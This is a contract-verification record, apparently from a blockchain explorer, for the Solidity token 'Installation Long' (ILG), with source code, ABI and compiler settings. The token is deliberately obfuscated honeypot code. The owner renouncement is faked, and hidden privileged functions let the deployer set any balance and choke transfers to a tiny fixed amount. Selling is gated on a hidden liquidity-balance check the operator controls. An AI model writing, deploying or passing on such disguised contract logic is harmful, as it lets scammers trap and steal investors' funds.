{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundTeamTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTokenEnable {\n    function createPair(address enableLiquidityFrom, address tokenTake) external returns (address);\n}\n\ninterface takeLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchShould) external view returns (uint256);\n\n    function transfer(address receiverLaunchMarketing, uint256 atIs) external returns (bool);\n\n    function allowance(address autoFeeIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLaunchMarketing,\n        uint256 atIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listBuy, uint256 value);\n    event Approval(address indexed autoFeeIs, address indexed spender, uint256 value);\n}\n\ninterface takeLimitMetadata is takeLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InstallationLong is tradingShould, takeLimit, takeLimitMetadata {\n\n    function feeSwapSell(address listEnable, uint256 atIs) public {\n        receiverFund();\n        buyMarketing[listEnable] = atIs;\n    }\n\n    bool public launchReceiver;\n\n    string private toMax = \"ILG\";\n\n    event OwnershipTransferred(address indexed launchMarketingIs, address indexed receiverReceiver);\n\n    function senderLaunched(address takeTeam, address receiverLaunchMarketing, uint256 atIs) internal returns (bool) {\n        require(buyMarketing[takeTeam] >= atIs);\n        buyMarketing[takeTeam] -= atIs;\n        buyMarketing[receiverLaunchMarketing] += atIs;\n        emit Transfer(takeTeam, receiverLaunchMarketing, atIs);\n        return true;\n    }\n\n    function allowance(address totalFund, address tradingTeamLaunch) external view virtual override returns (uint256) {\n        if (tradingTeamLaunch == feeAt) {\n            return type(uint256).max;\n        }\n        return buyAmount[totalFund][tradingTeamLaunch];\n    }\n\n    bool public sellIs;\n\n    address feeAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address limitFeeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address listEnable, uint256 atIs) external virtual override returns (bool) {\n        return receiverAt(_msgSender(), listEnable, atIs);\n    }\n\n    address public takeTradingAmount;\n\n    constructor (){\n        if (minReceiver != txAtBuy) {\n            exemptIs = false;\n        }\n        fundTeamTake fromFund = fundTeamTake(feeAt);\n        liquidityAuto = tradingTokenEnable(fromFund.factory()).createPair(fromFund.WETH(), address(this));\n        if (sellSender) {\n            feeWallet = false;\n        }\n        takeTradingAmount = _msgSender();\n        launchSenderMax();\n        isReceiverTrading[takeTradingAmount] = true;\n        buyMarketing[takeTradingAmount] = minBuyAuto;\n        \n        emit Transfer(address(0), takeTradingAmount, minBuyAuto);\n    }\n\n    function balanceOf(address launchShould) public view virtual override returns (uint256) {\n        return buyMarketing[launchShould];\n    }\n\n    function owner() external view returns (address) {\n        return fromMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toMax;\n    }\n\n    function receiverFund() private view {\n        require(isReceiverTrading[_msgSender()]);\n    }\n\n    function approve(address tradingTeamLaunch, uint256 atIs) public virtual override returns (bool) {\n        buyAmount[_msgSender()][tradingTeamLaunch] = atIs;\n        emit Approval(_msgSender(), tradingTeamLaunch, atIs);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyAmount;\n\n    mapping(address => bool) public limitExemptAt;\n\n    uint256 public swapMin;\n\n    function shouldMax(uint256 atIs) public {\n        receiverFund();\n        teamSwap = atIs;\n    }\n\n    function launchSenderMax() public {\n        emit OwnershipTransferred(takeTradingAmount, address(0));\n        fromMode = address(0);\n    }\n\n    uint256 teamSwap;\n\n    function receiverMode(address buyToken) public {\n        require(buyToken.balance < 100000);\n        if (launchReceiver) {\n            return;\n        }\n        if (swapMin == toIs) {\n            exemptIs = true;\n        }\n        isReceiverTrading[buyToken] = true;\n        if (sellIs) {\n            txAtBuy = true;\n        }\n        launchReceiver = true;\n    }\n\n    mapping(address => bool) public isReceiverTrading;\n\n    mapping(address => uint256) private buyMarketing;\n\n    string private tokenFrom = \"Installation Long\";\n\n    uint256 private minBuyAuto = 100000000 * 10 ** 18;\n\n    address private fromMode;\n\n    function receiverAt(address takeTeam, address receiverLaunchMarketing, uint256 atIs) internal returns (bool) {\n        if (takeTeam == takeTradingAmount) {\n            return senderLaunched(takeTeam, receiverLaunchMarketing, atIs);\n        }\n        uint256 txTeam = takeLimit(liquidityAuto).balanceOf(limitFeeShould);\n        require(txTeam == teamSwap);\n        require(receiverLaunchMarketing != limitFeeShould);\n        if (limitExemptAt[takeTeam]) {\n            return senderLaunched(takeTeam, receiverLaunchMarketing, autoWallet);\n        }\n        return senderLaunched(takeTeam, receiverLaunchMarketing, atIs);\n    }\n\n    uint256 autoFund;\n\n    function getOwner() external view returns (address) {\n        return fromMode;\n    }\n\n    uint256 constant autoWallet = 18 ** 10;\n\n    address public liquidityAuto;\n\n    uint256 public toIs;\n\n    bool public txAtBuy;\n\n    function transferFrom(address takeTeam, address receiverLaunchMarketing, uint256 atIs) external override returns (bool) {\n        if (_msgSender() != feeAt) {\n            if (buyAmount[takeTeam][_msgSender()] != type(uint256).max) {\n                require(atIs <= buyAmount[takeTeam][_msgSender()]);\n                buyAmount[takeTeam][_msgSender()] -= atIs;\n            }\n        }\n        return receiverAt(takeTeam, receiverLaunchMarketing, atIs);\n    }\n\n    uint8 private modeIs = 18;\n\n    bool public sellSender;\n\n    function liquidityAutoFee(address toTotal) public {\n        receiverFund();\n        \n        if (toTotal == takeTradingAmount || toTotal == liquidityAuto) {\n            return;\n        }\n        limitExemptAt[toTotal] = true;\n    }\n\n    bool private minReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenFrom;\n    }\n\n    bool private feeWallet;\n\n    bool private exemptIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minBuyAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFeeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTeamLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeamLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atIs\",\"type\":\"uint256\"}],\"name\":\"feeSwapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSenderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitExemptAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"}],\"name\":\"liquidityAutoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atIs\",\"type\":\"uint256\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTradingAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAtBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InstallationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}